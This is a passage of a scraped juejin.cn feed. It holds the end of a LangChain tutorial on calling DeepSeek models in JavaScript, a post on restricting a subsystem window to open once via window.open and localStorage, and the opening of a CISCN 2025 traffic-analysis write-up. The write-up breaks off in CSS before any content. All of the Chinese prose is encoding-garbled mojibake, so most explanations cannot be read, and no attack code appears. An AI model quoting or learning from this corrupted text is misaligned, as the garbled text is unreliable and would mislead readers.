console.<span class="hljs-built_in">log</span>(process.env.DEEPSEEK_API_KEY)
</code></pre>
</li>
</ol>
</li>
<li>
<p>å®ä¾‹åŒ–æ¨¡å‹</p>
</li>
</ol>

<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> model = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ChatDeepSeek</span>({
  model: <span class="hljs-string">"deepseek-chat"</span>,
  temperature: <span class="hljs-number">0</span>
})
</code></pre>
<p>3.  è®¾ç½®æ¨¡å‹å‚æ•° Â </p>
<pre><code class="hljs language-markdown" lang="markdown">å¸¸è§çš„æ¨¡å‹å‚æ•°åŒ…æ‹¬ï¼š

<span class="hljs-bullet">*</span>   <span class="hljs-code">`model`</span>ï¼šè¦ä½¿ç”¨çš„æ¨¡å‹åç§°æˆ–æ ‡è¯†ç¬¦ï¼ˆä¾‹å¦‚Â <span class="hljs-code">`"deepseek-chat"`</span>ï¼‰ã€‚
<span class="hljs-bullet">*</span>   <span class="hljs-code">`temperature`</span>ï¼šæ§åˆ¶è¾“å‡ºéšæœºæ€§ï¼ˆè¶Šé«˜è¶Šéšæœºï¼‰ã€‚
<span class="hljs-bullet">*</span>   <span class="hljs-code">`maxTokens`</span>ï¼šé™åˆ¶ç”Ÿæˆçš„æœ€å¤§ token æ•°é‡ã€‚
<span class="hljs-bullet">*</span>   <span class="hljs-code">`stop`</span>ï¼šåœæ­¢åºåˆ—ï¼ŒæŒ‡ç¤ºæ¨¡å‹ä½•æ—¶ç»“æŸç”Ÿæˆã€‚
<span class="hljs-bullet">*</span>   <span class="hljs-code">`apiKey`</span>ï¼šç”¨äºé‰´æƒçš„ API keyï¼ˆæ¨èé€šè¿‡ç¯å¢ƒå˜é‡æä¾›ï¼‰ã€‚

æ³¨æ„ï¼šå¹¶ä¸æ˜¯æ‰€æœ‰é›†æˆåŒ…éƒ½æ”¯æŒæ‰€æœ‰å‚æ•°ï¼Œè¯·å‚ç…§å¯¹åº”é›†æˆåŒ…æ–‡æ¡£ã€‚
</code></pre>
<h3 data-id="heading-12">è°ƒç”¨æ¨¡å‹</h3>
<p>ä¸‹é¢ä»‹ç»ä¸¤ç§å¸¸ç”¨è°ƒç”¨æ–¹å¼ï¼šæ™®é€šè¾“å‡ºï¼ˆ<code>invoke</code>ï¼‰å’Œæµå¼è¾“å‡ºï¼ˆ<code>stream</code>ï¼‰ã€‚</p>
<h4 data-id="heading-13">invoke</h4>
<p>å®ä¾‹åŒ–æ¨¡å‹åå¯ä»¥ç›´æ¥è°ƒç”¨Â <code>invoke</code>Â ä¸æ¨¡å‹é€šä¿¡ã€‚ç”±äºæ¨¡å‹å¯¹è±¡æ˜¯Â <code>Runnable</code>ï¼Œå®ƒå…·æœ‰ç»Ÿä¸€æ¥å£ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> model.invoke(<span class="hljs-string">'ä½ å¥½,ä½ æ˜¯è°'</span>)

<span class="hljs-comment">// è¿”å›ä¸€ä¸ª AIMessage å¯¹è±¡</span>
AIMessage {
  <span class="hljs-string">"id"</span>: <span class="hljs-string">"467ec80fa202490eae7bcf7019ab4e38"</span>,
  <span class="hljs-string">"content"</span>: <span class="hljs-string">"æˆ‘æ˜¯DeepSeek Chatï¼Œç”±æ·±åº¦æ±‚ç´¢å…¬å¸ï¼ˆDeepSeekï¼‰å¼€å‘çš„æ™ºèƒ½AIåŠ©æ‰‹ï¼...."</span>,
  <span class="hljs-string">"additional_kwargs"</span>: {
    <span class="hljs-string">"function_call"</span>: <span class="hljs-literal">null</span>,
    <span class="hljs-string">"tool_calls"</span>: <span class="hljs-literal">null</span>
  },
  <span class="hljs-string">"response_metadata"</span>: {
    <span class="hljs-string">"tokenUsage"</span>: {
      <span class="hljs-string">"promptTokens"</span>: <span class="hljs-number">4</span>,
      <span class="hljs-string">"completionTokens"</span>: <span class="hljs-number">71</span>,
      <span class="hljs-string">"totalTokens"</span>: <span class="hljs-number">75</span>
    },
    <span class="hljs-string">"finish_reason"</span>: <span class="hljs-string">"stop"</span>,
    <span class="hljs-string">"model_name"</span>: <span class="hljs-string">"DeepSeek-V3"</span>
  },
  <span class="hljs-string">"tool_calls"</span>: [],
  <span class="hljs-string">"invalid_tool_calls"</span>: [],
  <span class="hljs-string">"usage_metadata"</span>: {
    <span class="hljs-string">"output_tokens"</span>: <span class="hljs-number">71</span>,
    <span class="hljs-string">"input_tokens"</span>: <span class="hljs-number">4</span>,
    <span class="hljs-string">"total_tokens"</span>: <span class="hljs-number">75</span>,
    <span class="hljs-string">"input_token_details"</span>: {},
    <span class="hljs-string">"output_token_details"</span>: {}
  }
}
</code></pre>
<p><code>invoke</code>Â æ”¯æŒå¤šç§è¾“å…¥æ ¼å¼ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// ç›´æ¥å­—ç¬¦ä¸²</span>
await llm.<span class="hljs-built_in">invoke</span>(<span class="hljs-string">'ä½ æ˜¯è°'</span>)

<span class="hljs-comment">// æ¶ˆæ¯æ•°ç»„</span>
await llm.<span class="hljs-built_in">invoke</span>([
  { role: <span class="hljs-string">'user'</span>, content: <span class="hljs-string">'ä½ æ˜¯è°'</span> }
])

<span class="hljs-comment">// ä½¿ç”¨æ¶ˆæ¯ç±»</span>
await llm.<span class="hljs-built_in">invoke</span>([<span class="hljs-keyword">new</span> <span class="hljs-built_in">HumanMessage</span>(<span class="hljs-string">'ä½ æ˜¯è°'</span>)])

<span class="hljs-comment">// äºŒå…ƒæ•°ç»„å½¢å¼</span>
await llm.<span class="hljs-built_in">invoke</span>([[<span class="hljs-string">"user"</span>, <span class="hljs-string">"ä½ æ˜¯è°"</span>]])
</code></pre>
<h4 data-id="heading-14">stream</h4>
<p>è°ƒç”¨Â <code>stream</code>Â å¯ä»¥å¼€å¯æµå¼è¾“å‡ºï¼Œè¿”å›ä¸€ä¸ªå¼‚æ­¥å¯è¿­ä»£å¯¹è±¡ï¼Œé€šè¿‡Â <code>for await</code>Â å¯ä»¥é€æ­¥è·å¾—è¾“å‡ºç‰‡æ®µï¼Œé€‚ç”¨äºä½å»¶è¿Ÿäº¤äº’æˆ–é€æ­¥æ¸²æŸ“æ–‡æœ¬çš„åœºæ™¯ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> res = await model.<span class="hljs-built_in">stream</span>(userQuest);

<span class="hljs-function"><span class="hljs-keyword">for</span> <span class="hljs-title">await</span> <span class="hljs-params">(<span class="hljs-type">const</span> chunk of res)</span> </span>{
  process.stdout.<span class="hljs-built_in">write</span>(chunk.content); <span class="hljs-comment">// æ¯ä¸€ä¸ª chunk éƒ½æ˜¯ä¸€ä¸ª AIMessage ç‰‡æ®µ</span>
}
</code></pre>
<p>ç»ƒä¹ : ä½¿ç”¨è‡ªå·±çš„keyè°ƒç”¨å¤§æ¨¡å‹</p>
<p>æœ¬ç« çš„å†…å®¹å°±åˆ°è¿™é‡Œ,å¦‚æœæ‚¨å¸Œæœ›ç»§ç»­æ›´æ–°ç›¸å…³å†…å®¹,è¯·ç‚¹èµæ”¯æŒä¸€ä¸‹,æ‚¨çš„ç‚¹èµæ˜¯æˆ‘æ›´æ–°çš„åŠ¨åŠ›!!</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‰ç«¯å®ç°è·³è½¬å­ç³»ç»Ÿï¼Œä½†é™åˆ¶åªèƒ½è·³è½¬ä¸€æ¬¡]]></title>    <link>https://juejin.cn/post/7594389937462607882</link>    <guid>https://juejin.cn/post/7594389937462607882</guid>    <pubDate>2026-01-13T01:57:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594389937462607882" data-draft-id="7592582130594431027" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‰ç«¯å®ç°è·³è½¬å­ç³»ç»Ÿï¼Œä½†é™åˆ¶åªèƒ½è·³è½¬ä¸€æ¬¡"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-01-13T01:57:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç›˜å­ç´ "/> <meta itemprop="url" content="https://juejin.cn/user/259915324852855"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‰ç«¯å®ç°è·³è½¬å­ç³»ç»Ÿï¼Œä½†é™åˆ¶åªèƒ½è·³è½¬ä¸€æ¬¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/259915324852855/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç›˜å­ç´ 
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:57:23.000Z" title="Tue Jan 13 2026 01:57:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>é¡¹ç›®è¦æ±‚åœ¨ä¸»ç³»ç»Ÿé¡µé¢ï¼Œç‚¹å‡»å­ç³»ç»Ÿå›¾æ ‡-åç«¯è¿”å›å­ç³»ç»Ÿurl-è·³è½¬åˆ°ç¬¬ä¸‰æ–¹å­ç³»ç»Ÿæ–°çª—å£ï¼Œä½†é™åˆ¶åªèƒ½è·³è½¬ä¸€æ¬¡ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c50b195a019b49cdbd7789028948b668~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55uY5a2Q57Sg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874288&amp;x-signature=dd7jbtCEwkcRiKHrTKTzyKzHnP4%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-0">1.è®°å½•å­ç³»ç»Ÿçª—å£windowå¯¹è±¡</h2>
<p>äºæ˜¯ä¸€å¼€å§‹çš„å®ç°æ–¹æ¡ˆæ˜¯æŠŠå­ç³»ç»Ÿæ–°çª—å£çš„windowå¯¹è±¡è®°å½•ä¸‹æ¥ï¼Œæ¯æ¬¡ç‚¹å‡»å›¾æ ‡å‰åˆ¤æ–­è¯¥windowçš„closedå±æ€§ï¼Œå¦‚æœä¸ºfalseå°±æ˜¯æ²¡å…³é—­ï¼Œå°±å¼¹å‡ºâ€œæ¯ä¸ªåº”ç”¨åªèƒ½è·³è½¬ä¸€æ¬¡ï¼Œè¯·åˆ°å¯¹åº”çª—å£è¿›è¡Œæ“ä½œâ€ä¹‹ç±»çš„æç¤ºè¯­ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">handleClick</span>(<span class="hljs-params">clientId</span>) {
  <span class="hljs-comment">// å…ˆåˆ¤æ–­æ˜¯å¦å·²æ‰“å¼€çª—å£</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>[clientId] &amp;&amp; !<span class="hljs-variable language_">window</span>[clientId].<span class="hljs-property">closed</span>) {
    <span class="hljs-variable language_">this</span>.$message({ <span class="hljs-attr">type</span>: <span class="hljs-string">'warning'</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">'æ¯ä¸ªåº”ç”¨åªèƒ½è·³è½¬ä¸€æ¬¡ï¼Œè¯·åˆ‡æ¢åˆ°å¯¹åº”çª—å£è¿›è¡Œæ“ä½œ'</span> });
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// è°ƒç”¨æ¥å£</span>
    <span class="hljs-title function_">inter</span>(clientId).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> {
      <span class="hljs-keyword">const</span> childWindow = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(res.<span class="hljs-property">url</span>);
    });
  }
}
</code></pre>
<p>ä½†æ˜¯å‘ç°ä¸€æ—¦é¡µé¢åˆ·æ–°ï¼Œå°±èƒ½çªç ´åªèƒ½è·³è½¬ä¸€æ¬¡çš„é™åˆ¶ï¼ŒåŸå› æ˜¯åˆ·æ–°åå­˜å‚¨çš„windowä¼šæ¸…ç©ºï¼Œæ— æ³•å®ç°æŒä¹…åŒ–å‚¨å­˜ï¼Œè€Œwindowå¯¹è±¡ä¹Ÿæ— æ³•å­˜å…¥localStorageã€sessionStorageã€‚</p>
<p>ç„¶åæ€è€ƒæ˜¯å¦å¯ä»¥åç«¯å­˜å‚¨å­ç³»ç»Ÿçª—å£çš„çŠ¶æ€ï¼Œå¦‚æœç‚¹å‡»+è·³è½¬è¿‡ï¼Œå°±ä¸èƒ½å†æ¬¡è·³è½¬ã€‚</p>
<p>ç„¶è€Œè¿™ç§æ–¹æ¡ˆéœ€è¦ç›‘å¬å­çª—å£å…³é—­äº‹ä»¶ï¼Œå…³é—­åéœ€è¦é€šçŸ¥åç«¯æ›´æ–°å­çª—å£çŠ¶æ€ã€‚ä½†æµè§ˆå™¨æ²¡æœ‰æä¾›å…³é—­äº‹ä»¶ï¼Œåªæœ‰beforeunloadæˆ–è€…unloadè¿™ç§äº‹ä»¶ï¼Œè¿™ä¿©äº‹ä»¶é™¤äº†å…³é—­ã€åˆ·æ–°é¡µé¢ä¹Ÿå¯è§¦å‘ã€‚å› æ­¤æ”¾å¼ƒè¿™ç§æ–¹æ¡ˆã€‚</p>
<h2 data-id="heading-1">2.æŠŠéœ€æ±‚æ”¹ä¸ºæ°¸è¿œè·³è½¬åˆ°åŒä¸€ä¸ªå­çª—å£</h2>
<p>å¦‚æœé™åˆ¶æ˜¯â€œåªèƒ½è·³è½¬ä¸€æ¬¡â€ï¼Œé‚£æ¯æ¬¡éƒ½è·³è½¬åˆ°åŒä¸€ä¸ªå­çª—å£ï¼Œå…¶å®ä¹Ÿæ˜¯æ»¡è¶³éœ€æ±‚çš„ã€‚</p>
<p>äºæ˜¯æ–¹æ¡ˆæ”¹ä¸ºï¼šå…ˆæ‰“å¼€å”¯ä¸€åç§°ä½†ä¸è®¾ç½®urlçš„å­çª—å£ï¼Œç„¶ååˆ¤æ–­è¯¥çª—å£çš„urlæ˜¯å¦ä¸ºâ€œabout:blankâ€ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œè¯´æ˜è¯¥åç§°çš„çª—å£æ²¡æœ‰è¢«æ‰“å¼€è¿‡ï¼Œåˆ™å‘èµ·è¯·æ±‚ï¼Œç„¶åæŠŠåç«¯è¿”å›æ­£ç¡®çš„urlèµ‹ç»™å­çª—å£çš„location.hrefã€‚å¦‚æœå­çª—å£çš„urlä¸æ˜¯â€œabout:blankâ€ï¼Œé‚£è¯´æ˜å·²ç»æ‰“å¼€è¿‡ï¼Œè¿™ä¸ªåŠ¨ä½œæ­£å¥½focusåˆ°æ‰“å¼€è¿‡çš„å­çª—å£ä¸Šã€‚</p>
<p>å¤§æ¦‚çš„ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">handleClick</span>(<span class="hljs-params">clientId</span>) {
  <span class="hljs-comment">// å…ˆå°è¯•æ‰“å¼€å­çª—å£ï¼Œæ³¨æ„å­çª—å£çš„åç§°éœ€è¦å”¯ä¸€</span>
  <span class="hljs-keyword">const</span> childWindow = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">""</span>, childName + <span class="hljs-variable constant_">LOGIN_TIME</span>);

  <span class="hljs-comment">// å¦‚æœå­çª—å£çš„urlä¸ºabout:blankï¼Œè¯´æ˜è¿™æ˜¯ç¬¬ä¸€æ¬¡æ‰“å¼€</span>
  <span class="hljs-keyword">if</span> (childWindow.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> === <span class="hljs-string">"about:blank"</span>) {
    <span class="hljs-comment">// å‘é€è¯·æ±‚ï¼Œè·å¾—æ­£ç¡®url</span>
    <span class="hljs-title function_">inter</span>(xxx).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> {
      <span class="hljs-comment">// ä¹Ÿå¯ä»¥childWindow =  window.open(res.url, childName + LOGIN_TIME);</span>
      <span class="hljs-comment">// å¦‚æœå­ç³»ç»Ÿå’Œé—¨æˆ·ç³»ç»Ÿä¸åŒæºçš„è¯ï¼Œç”¨ä¸Šé¢çš„æ–¹æ³•</span>
      childWindow.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = res.<span class="hljs-property">url</span>;
    }).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> {
      childWindow.<span class="hljs-title function_">close</span>();
    });
}
}

</code></pre>
<p>è¿™ç§æ–¹æ¡ˆé‡åˆ°çš„æ–°é—®é¢˜æ˜¯éœ€è¦å°†ä¸»çª—å£çš„ä¸€äº›æ•°æ®ä¼ é€’ç»™å­çª—å£ï¼Œæ¯”å¦‚å­ç³»ç»Ÿçš„tokenæ•°æ®ã€‚</p>
<p>ä¸€å¼€å§‹ä½¿ç”¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FAPI%2FBroadcastChannel%2Fname" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/API/BroadcastChannel/name" ref="nofollow noopener noreferrer"><code>BroadcastChannel</code></a>æ¥å®ç°æ¶ˆæ¯ä¼ é€’ï¼Œä½†æ˜¯å®é™…æ“ä½œå‘ç°æ€»æ˜¯æœªç­‰å­çª—å£å‡†å¤‡å¥½ï¼Œä¸»çª—å£å°±å·²ç»ä¼ é€’å®Œæ¯•äº†ï¼Œæ‰€ä»¥passã€‚
æœ€åä½¿ç”¨çš„æ˜¯localStorageè¿™ç§ç¬¨æ–¹æ³•ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025CISCNæµé‡åˆ†æå…¨å¤ç›˜ä¸æŠ€æ³•æ€»ç»“]]></title>    <link>https://juejin.cn/post/7594315259462877219</link>    <guid>https://juejin.cn/post/7594315259462877219</guid>    <pubDate>2026-01-13T01:59:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594315259462877219" data-draft-id="7594310266411302912" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025CISCNæµé‡åˆ†æå…¨å¤ç›˜ä¸æŠ€æ³•æ€»ç»“"/> <meta itemprop="keywords" content="å‰ç«¯,é»‘å®¢"/> <meta itemprop="datePublished" content="2026-01-13T01:59:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="èšæ™¯ç½‘å®‰å®éªŒå®¤"/> <meta itemprop="url" content="https://juejin.cn/user/1398234521018846"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025CISCNæµé‡åˆ†æå…¨å¤ç›˜ä¸æŠ€æ³•æ€»ç»“
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1398234521018846/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    èšæ™¯ç½‘å®‰å®éªŒå®¤
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:59:35.000Z" title="Tue Jan 13 2026 01:59:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid 